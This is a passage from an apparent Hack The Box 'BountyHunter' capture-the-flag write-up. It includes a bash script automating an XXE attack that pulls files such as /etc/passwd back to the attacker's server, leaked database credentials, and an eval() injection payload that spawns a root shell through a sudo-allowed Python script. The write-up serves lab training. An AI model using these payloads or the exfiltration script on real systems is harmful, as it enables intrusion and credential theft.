WxzZQp1c2JtdXg6eDoxMTI6NDY6dXNibXV4IGRhZW1vbiwsLDovdmFyL2xpYi91c2JtdXg6L3Vzci9zYmluL25vbG9naW4K HTTP/1.0&#34;</span> <span style="color:#a5d6ff">200</span> -
</span></span></code></pre></div><p>Sending the requests yields an almost immediate request for the second stage of the payload and shortly thereafter another request that includes a base64-encoded <code>/etc/passwd</code> file.</p>
<p>This was a pretty ugly and tedious process, so the natural next step was to spend an hour writing a script for something that would&rsquo;ve taken 20 minutes to do manually. <em>Maximum efficiency</em>.</p>
<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#8b949e;font-weight:bold;font-style:italic">#!/bin/bash
</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-weight:bold;font-style:italic"></span>
</span></span><span style="display:flex;"><span><span style="color:#ff7b72">function</span> initialize_py_server <span style="color:#ff7b72;font-weight:bold">{</span> 
</span></span><span style="display:flex;"><span>    mkdir -p <span style="color:#ff7b72;font-weight:bold">{</span>./php_xxe_lfi/http_logs,./php_xxe_lfi/exfil<span style="color:#ff7b72;font-weight:bold">}</span>
</span></span><span style="display:flex;"><span>    echo <span style="color:#a5d6ff">&#39;Initializing Python HTTP server...&#39;</span>
</span></span><span style="display:flex;"><span>    python3 -m http.server <span style="color:#a5d6ff">80</span> &amp;&gt; ./php_xxe_lfi/http_logs/requests.log &amp;
</span></span><span style="display:flex;"><span>    <span style="color:#79c0ff">RESULT</span><span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#79c0ff">$?</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">if</span> <span style="color:#ff7b72;font-weight:bold">[</span> <span style="color:#79c0ff">$RESULT</span> -eq <span style="color:#a5d6ff">0</span> <span style="color:#ff7b72;font-weight:bold">]</span>; <span style="color:#ff7b72">then</span>
</span></span><span style="display:flex;"><span>        sleep 0.5
</span></span><span style="display:flex;"><span>        echo <span style="color:#a5d6ff">&#39;HTTP server successfully started on port 80.&#39;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">else</span>
</span></span><span style="display:flex;"><span>            echo <span style="color:#a5d6ff">&#39;HTTP server did not start. Exiting gracefully...&#39;</span>
</span></span><span style="display:flex;"><span>            kill_py_server
</span></span><span style="display:flex;"><span>            exit
</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">fi</span>
</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff7b72">function</span> kill_py_server <span style="color:#ff7b72;font-weight:bold">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#79c0ff">python_processes</span><span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#ff7b72">$(</span>ps aux | grep <span style="color:#a5d6ff">&#39;python3 -m http.server 80&#39;</span> | grep -v <span style="color:#a5d6ff">&#39;grep&#39;</span> | awk <span style="color:#a5d6ff">&#39;{print $2}&#39;</span><span style="color:#ff7b72">)</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff7b72">for</span> i in <span style="color:#79c0ff">$python_processes</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff7b72">do</span>
</span></span><span style="display:flex;"><span>                sudo kill <span style="color:#79c0ff">$i</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff7b72">done</span>
</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>get_file<span style="color:#ff7b72;font-weight:bold">()</span> <span style="color:#ff7b72;font-weight:bold">{</span> 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#79c0ff">stage2</span><span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#ff7b72">$(</span>echo <span style="color:#a5d6ff">$&#39;\n&#34;&gt;&#39;</span><span style="color:#ff7b72">)</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">if</span> <span style="color:#ff7b72;font-weight:bold">[</span> <span style="color:#a5d6ff">&#34;</span><span style="color:#79c0ff">$1</span><span style="color:#a5d6ff">&#34;</span> <span style="color:#ff7b72;font-weight:bold">==</span> <span style="color:#a5d6ff">&#34;&#34;</span> <span style="color:#ff7b72;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">then</span>
</span></span><span style="display:flex;"><span>        echo <span style="color:#a5d6ff">&#34;No file requested.&#34;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">else</span>
</span></span><span style="display:flex;"><span>        echo <span style="color:#79c0ff">$stage2</span> &gt; lfi-stage2.xml
</span></span><span style="display:flex;"><span>        curl -i -s -k -X <span style="color:#a5d6ff">$&#39;POST&#39;</span> <span style="color:#79c0ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#79c0ff"></span>            -H <span style="color:#a5d6ff">$&#39;Host: 10.10.11.100&#39;</span> <span style="color:#79c0ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#79c0ff"></span>            -H <span style="color:#a5d6ff">$&#39;Content-Length: 223&#39;</span> <span style="color:#79c0ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#79c0ff"></span>            -H <span style="color:#a5d6ff">$&#39;Accept: */*&#39;</span> <span style="color:#79c0ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#79c0ff"></span>            -H <span style="color:#a5d6ff">$&#39;X-Requested-With: XMLHttpRequest&#39;</span> <span style="color:#79c0ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#79c0ff"></span>            -H <span style="color:#a5d6ff">$&#39;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36&#39;</span> <span style="color:#79c0ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#79c0ff"></span>            -H <span style="color:#a5d6ff">$&#39;Content-Type: application/x-www-form-urlencoded; charset=UTF-8&#39;</span> <span style="color:#79c0ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#79c0ff"></span>            -H <span style="color:#a5d6ff">$&#39;Origin: http://10.10.11.100&#39;</span> <span style="color:#79c0ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#79c0ff"></span>            -H <span style="color:#a5d6ff">$&#39;Referer: http://10.10.11.100/log_submit.php&#39;</span> <span style="color:#79c0ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#79c0ff"></span>            -H <span style="color:#a5d6ff">$&#39;Accept-Encoding: gzip, deflate&#39;</span> <span style="color:#79c0ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#79c0ff"></span>            -H <span style="color:#a5d6ff">$&#39;Accept-Language: en-US,en;q=0.9&#39;</span> <span style="color:#79c0ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#79c0ff"></span>            -H <span style="color:#a5d6ff">$&#39;Connection: close&#39;</span> <span style="color:#79c0ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#79c0ff"></span>            --data-binary <span style="color:#a5d6ff">$&#39;data=PD94bWwgdmVyc2lvbj0iMS4wIiA/Pg0KPCFET0NUWVBFIHIgWw0KPCFFTEVNRU5UIHIgQU5ZID4NCjwhRU5USVRZICUgc3AgU1lTVEVNICJodHRwOi8vMTAuMTAuMTQuMTAvbGZpLXN0YWdlMi54bWwiPg0KJXNwOw0KJXBhcmFtMTsNCl0%2bDQo8dGl0bGU%2bJmV4ZmlsOzwvdGl0bGU%2b&#39;</span> <span style="color:#79c0ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#79c0ff"></span>            <span style="color:#a5d6ff">$&#39;http://10.10.11.100/tracker_diRbPr00f314.php&#39;</span> &amp;&gt; /dev/null
</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">fi</span>
</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff7b72">function</span> main <span style="color:#ff7b72;font-weight:bold">{</span> 
</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">#kill http server if currently running on port 80</span>
</span></span><span style="display:flex;"><span>kill_py_server
</span></span><span style="display:flex;"><span>initialize_py_server
</span></span><span style="display:flex;"><span><span style="color:#ff7b72">while</span> true
</span></span><span style="display:flex;"><span><span style="color:#ff7b72">do</span>
</span></span><span style="display:flex;"><span>    echo -n <span style="color:#a5d6ff">&#34;Enter desired file: &#34;</span>
</span></span><span style="display:flex;"><span>    read FILENAME
</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">if</span> <span style="color:#ff7b72;font-weight:bold">[</span> <span style="color:#a5d6ff">&#34;</span><span style="color:#79c0ff">$FILENAME</span><span style="color:#a5d6ff">&#34;</span> <span style="color:#ff7b72;font-weight:bold">==</span> <span style="color:#a5d6ff">&#34;exit&#34;</span> <span style="color:#ff7b72;font-weight:bold">]</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">then</span>
</span></span><span style="display:flex;"><span>        echo <span style="color:#a5d6ff">&#34;Goodbye...&#34;</span>
</span></span><span style="display:flex;"><span>        kill_py_server
</span></span><span style="display:flex;"><span>        exit
</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">else</span>
</span></span><span style="display:flex;"><span>        get_file <span style="color:#79c0ff">$FILENAME</span>
</span></span><span style="display:flex;"><span>        cat ./php_xxe_lfi/http_logs/requests.log | tail -1 | awk -F<span style="color:#a5d6ff">&#34;?&#34;</span> <span style="color:#a5d6ff">&#39;{print $2}&#39;</span> | awk <span style="color:#a5d6ff">&#39;{print $1}&#39;</span> | base64 -d
</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">fi</span>
</span></span><span style="display:flex;"><span><span style="color:#ff7b72">done</span>
</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>main
</span></span></code></pre></div><p>The bash script is in many ways pretty ugly, but it simply utilizes curl to send the first stage of the payload exactly as it was done with BurpSuite and dynamically generates the second stage of the payload based on what the user requests it to grab. The response is decoded in a way such that the user never sees the base64, rather just a neat plaintext output of the requested file.</p>
<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>┌──<span style="color:#ff7b72;font-weight:bold">(</span>kali@kali<span style="color:#ff7b72;font-weight:bold">)</span>-<span style="color:#ff7b72;font-weight:bold">[</span>~/htb/bountyhunter<span style="color:#ff7b72;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span>└─$ sudo ./get_file.sh                 
</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>sudo<span style="color:#ff7b72;font-weight:bold">]</span> password <span style="color:#ff7b72">for</span> kali: 
</span></span><span style="display:flex;"><span>Initializing Python HTTP server...
</span></span><span style="display:flex;"><span>HTTP server successfully started on port 80.
</span></span><span style="display:flex;"><span>Enter desired file: /etc/passwd
</span></span><span style="display:flex;"><span>root:x:0:0:root:/root:/bin/bash
</span></span><span style="display:flex;"><span>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>bin:x:2:2:bin:/bin:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>sys:x:3:3:sys:/dev:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>sync:x:4:65534:sync:/bin:/bin/sync
</span></span><span style="display:flex;"><span>games:x:5:60:games:/usr/games:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>gnats:x:41:41:Gnats Bug-Reporting System <span style="color:#ff7b72;font-weight:bold">(</span>admin<span style="color:#ff7b72;font-weight:bold">)</span>:/var/lib/gnats:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>syslog:x:104:110::/home/syslog:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
</span></span><span style="display:flex;"><span>uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>pollinate:x:110:1::/var/cache/pollinate:/bin/false
</span></span><span style="display:flex;"><span>sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>development:x:1000:1000:Development:/home/development:/bin/bash
</span></span><span style="display:flex;"><span>lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
</span></span><span style="display:flex;"><span>usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>Enter desired file: exit
</span></span><span style="display:flex;"><span>Goodbye...    
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>┌──<span style="color:#ff7b72;font-weight:bold">(</span>kali@kali<span style="color:#ff7b72;font-weight:bold">)</span>-<span style="color:#ff7b72;font-weight:bold">[</span>~/htb/bountyhunter<span style="color:#ff7b72;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span>└─$ 
</span></span></code></pre></div><p>With that done, I went back to the gobuster scans that were performed earlier and identified some things that warranted further enumeration. Namely, the <code>db.php</code> file seemed interesting. Using the above script, I pulled down the source code of the file and found credentials:</p>
<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">&lt;?</span>php
</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">// TODO -&gt; Implement login system with the database.
</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic"></span><span style="color:#79c0ff">$dbserver</span> <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">&#34;localhost&#34;</span>;
</span></span><span style="display:flex;"><span><span style="color:#79c0ff">$dbname</span> <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">&#34;bounty&#34;</span>;
</span></span><span style="display:flex;"><span><span style="color:#79c0ff">$dbusername</span> <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">&#34;admin&#34;</span>;
</span></span><span style="display:flex;"><span><span style="color:#79c0ff">$dbpassword</span> <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">&#34;m19RoAU0hP41A1sTsq6K&#34;</span>;
</span></span><span style="display:flex;"><span><span style="color:#79c0ff">$testuser</span> <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">&#34;test&#34;</span>;
</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-weight:bold;font-style:italic">?&gt;</span><span style="color:#f85149">
</span></span></span></code></pre></div><p>Using that password as well as the custom <code>development</code> user identified during analysis of the <code>/etc/passwd</code> file, I was able to SSH into the machine.</p>
<h1 id="privilege-escalation">
  Privilege Escalation
  <a class="heading-link" href="#privilege-escalation">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h1>
<p>Upon login, the creator of the machine barely attempts to obfuscate the privilege escalation path, leaving a descriptive file in the <code>development</code> user&rsquo;s home directory called <code>contract.txt</code>. Given the reference to permissions, I ran the <code>sudo -l</code> command, which showed that the <code>development</code> user was able to run a specific python script as <code>root</code>. The commands&rsquo; and script&rsquo;s contents were as follows:</p>
<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>development@bountyhunter:~$ ls
</span></span><span style="display:flex;"><span>contract.txt  user.txt
</span></span><span style="display:flex;"><span>development@bountyhunter:~$ cat contract.txt 
</span></span><span style="display:flex;"><span>Hey team,
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>I<span style="color:#a5d6ff">&#39;ll be out of the office this week but please make sure that our contract with Skytrain Inc gets completed.
</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">
</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">This has been our first job since the &#34;rm -rf&#34; incident and we can&#39;</span>t mess this up. Whenever one of you gets on please have a look at the internal tool they sent over. There have been a handful of tickets submitted that have been failing validation and I need you to figure out why.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>I set up the permissions <span style="color:#ff7b72">for</span> you to test this. Good luck.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>-- John
</span></span><span style="display:flex;"><span>development@bountyhunter:~$ sudo -l
</span></span><span style="display:flex;"><span>Matching Defaults entries <span style="color:#ff7b72">for</span> development on bountyhunter:
</span></span><span style="display:flex;"><span>    env_reset, mail_badpass, <span style="color:#79c0ff">secure_path</span><span style="color:#ff7b72;font-weight:bold">=</span>/usr/local/sbin<span style="color:#79c0ff">\:</span>/usr/local/bin<span style="color:#79c0ff">\:</span>/usr/sbin<span style="color:#79c0ff">\:</span>/usr/bin<span style="color:#79c0ff">\:</span>/sbin<span style="color:#79c0ff">\:</span>/bin<span style="color:#79c0ff">\:</span>/snap/bin
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>User development may run the following commands on bountyhunter:
</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72;font-weight:bold">(</span>root<span style="color:#ff7b72;font-weight:bold">)</span> NOPASSWD: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
</span></span><span style="display:flex;"><span>development@bountyhunter:~$
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">#Skytrain Inc Ticket Validation System 0.1</span>
</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">#Do not distribute this file.</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff7b72">def</span> <span style="color:#d2a8ff;font-weight:bold">load_file</span>(loc):
</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">if</span> loc<span style="color:#ff7b72;font-weight:bold">.</span>endswith(<span style="color:#a5d6ff">&#34;.md&#34;</span>):
</span></span><span style="display:flex;"><span>        <span style="color:#ff7b72">return</span> open(loc, <span style="color:#a5d6ff">&#39;r&#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">else</span>:
</span></span><span style="display:flex;"><span>        print(<span style="color:#a5d6ff">&#34;Wrong file type.&#34;</span>)
</span></span><span style="display:flex;"><span>        exit()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff7b72">def</span> <span style="color:#d2a8ff;font-weight:bold">evaluate</span>(ticketFile):
</span></span><span style="display:flex;"><span>    <span style="color:#8b949e;font-style:italic">#Evaluates a ticket to check for ireggularities.</span>
</span></span><span style="display:flex;"><span>    code_line <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#79c0ff">None</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">for</span> i,x <span style="color:#ff7b72;font-weight:bold">in</span> enumerate(ticketFile<span style="color:#ff7b72;font-weight:bold">.</span>readlines()):
</span></span><span style="display:flex;"><span>        <span style="color:#ff7b72">if</span> i <span style="color:#ff7b72;font-weight:bold">==</span> <span style="color:#a5d6ff">0</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#ff7b72">if</span> <span style="color:#ff7b72;font-weight:bold">not</span> x<span style="color:#ff7b72;font-weight:bold">.</span>startswith(<span style="color:#a5d6ff">&#34;# Skytrain Inc&#34;</span>):
</span></span><span style="display:flex;"><span>                <span style="color:#ff7b72">return</span> <span style="color:#79c0ff">False</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff7b72">continue</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff7b72">if</span> i <span style="color:#ff7b72;font-weight:bold">==</span> <span style="color:#a5d6ff">1</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#ff7b72">if</span> <span style="color:#ff7b72;font-weight:bold">not</span> x<span style="color:#ff7b72;font-weight:bold">.</span>startswith(<span style="color:#a5d6ff">&#34;## Ticket to &#34;</span>):
</span></span><span style="display:flex;"><span>                <span style="color:#ff7b72">return</span> <span style="color:#79c0ff">False</span>
</span></span><span style="display:flex;"><span>            print(<span style="color:#79c0ff">f</span><span style="color:#a5d6ff">&#34;Destination: </span><span style="color:#a5d6ff">{</span><span style="color:#a5d6ff">&#39; &#39;</span><span style="color:#ff7b72;font-weight:bold">.</span>join(x<span style="color:#ff7b72;font-weight:bold">.</span>strip()<span style="color:#ff7b72;font-weight:bold">.</span>split(<span style="color:#a5d6ff">&#39; &#39;</span>)[<span style="color:#a5d6ff">3</span>:])<span style="color:#a5d6ff">}</span><span style="color:#a5d6ff">&#34;</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#ff7b72">continue</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff7b72">if</span> x<span style="color:#ff7b72;font-weight:bold">.</span>startswith(<span style="color:#a5d6ff">&#34;__Ticket Code:__&#34;</span>):
</span></span><span style="display:flex;"><span>            code_line <span style="color:#ff7b72;font-weight:bold">=</span> i<span style="color:#ff7b72;font-weight:bold">+</span><span style="color:#a5d6ff">1</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff7b72">continue</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff7b72">if</span> code_line <span style="color:#ff7b72;font-weight:bold">and</span> i <span style="color:#ff7b72;font-weight:bold">==</span> code_line:
</span></span><span style="display:flex;"><span>            <span style="color:#ff7b72">if</span> <span style="color:#ff7b72;font-weight:bold">not</span> x<span style="color:#ff7b72;font-weight:bold">.</span>startswith(<span style="color:#a5d6ff">&#34;**&#34;</span>):
</span></span><span style="display:flex;"><span>                <span style="color:#ff7b72">return</span> <span style="color:#79c0ff">False</span>
</span></span><span style="display:flex;"><span>            ticketCode <span style="color:#ff7b72;font-weight:bold">=</span> x<span style="color:#ff7b72;font-weight:bold">.</span>replace(<span style="color:#a5d6ff">&#34;**&#34;</span>, <span style="color:#a5d6ff">&#34;&#34;</span>)<span style="color:#ff7b72;font-weight:bold">.</span>split(<span style="color:#a5d6ff">&#34;+&#34;</span>)[<span style="color:#a5d6ff">0</span>]
</span></span><span style="display:flex;"><span>            <span style="color:#ff7b72">if</span> int(ticketCode) <span style="color:#ff7b72;font-weight:bold">%</span> <span style="color:#a5d6ff">7</span> <span style="color:#ff7b72;font-weight:bold">==</span> <span style="color:#a5d6ff">4</span>:
</span></span><span style="display:flex;"><span>                validationNumber <span style="color:#ff7b72;font-weight:bold">=</span> eval(x<span style="color:#ff7b72;font-weight:bold">.</span>replace(<span style="color:#a5d6ff">&#34;**&#34;</span>, <span style="color:#a5d6ff">&#34;&#34;</span>))
</span></span><span style="display:flex;"><span>                <span style="color:#ff7b72">if</span> validationNumber <span style="color:#ff7b72;font-weight:bold">&amp;</span>gt; <span style="color:#a5d6ff">100</span>:
</span></span><span style="display:flex;"><span>                    <span style="color:#ff7b72">return</span> <span style="color:#79c0ff">True</span>
</span></span><span style="display:flex;"><span>                <span style="color:#ff7b72">else</span>:
</span></span><span style="display:flex;"><span>                    <span style="color:#ff7b72">return</span> <span style="color:#79c0ff">False</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">return</span> <span style="color:#79c0ff">False</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff7b72">def</span> <span style="color:#d2a8ff;font-weight:bold">main</span>():
</span></span><span style="display:flex;"><span>    fileName <span style="color:#ff7b72;font-weight:bold">=</span> input(<span style="color:#a5d6ff">&#34;Please enter the path to the ticket file.</span><span style="color:#79c0ff">\n</span><span style="color:#a5d6ff">&#34;</span>)
</span></span><span style="display:flex;"><span>    ticket <span style="color:#ff7b72;font-weight:bold">=</span> load_file(fileName)
</span></span><span style="display:flex;"><span>    <span style="color:#8b949e;font-style:italic">#DEBUG print(ticket)</span>
</span></span><span style="display:flex;"><span>    result <span style="color:#ff7b72;font-weight:bold">=</span> evaluate(ticket)
</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">if</span> (result):
</span></span><span style="display:flex;"><span>        print(<span style="color:#a5d6ff">&#34;Valid ticket.&#34;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">else</span>:
</span></span><span style="display:flex;"><span>        print(<span style="color:#a5d6ff">&#34;Invalid ticket.&#34;</span>)
</span></span><span style="display:flex;"><span>    ticket<span style="color:#ff7b72;font-weight:bold">.</span>close
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>main()
</span></span></code></pre></div><p>The script itself is relatively mundane, it simply determines whether a given ticket is valid based on its contents. What is, however, interesting about the file is its use of Python&rsquo;s <code>eval()</code> function, which could allow for code execution assuming the inputs are not properly sanitized. In this case, it appears that may be the case, assuming all of the prerequisite checks pass. The key for exploiting this script is to create a perfectly valid Markdown file that passes all checks right up to the point of the script calling <code>eval()</code> and then injecting a system call. In my case, this is what was required:</p>
<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-markdown" data-lang="markdown"><span style="display:flex;"><span><span style="color:#79c0ff;font-weight:bold"># Skytrain Inc
</span></span></span><span style="display:flex;"><span><span style="color:#79c0ff;font-weight:bold"></span><span style="color:#79c0ff">## Ticket to Nowhere
</span></span></span><span style="display:flex;"><span><span style="color:#79c0ff"></span>__Ticket Code:__
</span></span><span style="display:flex;"><span>**109 + <span style="font-weight:bold">__import__</span>(&#39;os&#39;).system(&#39;/bin/bash&#39;)#
</span></span></code></pre></div><p>Running the script with <code>sudo</code> permissions results in a shell as <code>root</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>development@bountyhunter:~$ sudo /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
</span></span><span style="display:flex;"><span>Please enter the path to the ticket file.
</span></span><span style="display:flex;"><span>/home/development/privesc.md
</span></span><span style="display:flex;"><span>Destination: Nowhere
</span></span><span style="display:flex;"><span>root@bountyhunter:/home/development# id
</span></span><span style="display:flex;"><span><span style="color:#79c0ff">uid</span><span style="color:#ff7b72;font-weight:bold">=</span>0<span style="color:#ff7b72;font-weight:bold">(</span>root<span style="color:#ff7b72;font-weight:bold">)</span> <span style="color:#79c0ff">gid</span><span style="color:#ff7b72;font-weight:bold">=</span>0<span style="color:#ff7b72;font-weight:bold">(</span>root<span style="color:#ff7b72;font-weight:bold">)</span> <span style="color:#79c0ff">groups</span><span style="color:#ff7b72;font-weight:bold">=</span>0<span style="color:#ff7b72;font-weight:bold">(</span>root<span style="color:#ff7b72;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span>root@bountyhunter:/home/development# wc -c /root/root.txt
</span></span><span style="display:flex;"><span><span style="color:#a5d6ff">33</span> /root/root.txt
</span></span><span style="display:flex;"><span>root@bountyhunter:/home/development# 
</span></span></code></pre></div>
      </div>


      <footer>
        


        
        
        
        
        
        
        
      </footer>
    </article>

    
  </section>

    </div>

    <footer class="footer">
  <section class="container">
    ©
    
      2020 -
    
    2025
     matt johnson 
    ·
    
    Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/" target="_blank" rel="noopener">Coder</a>.
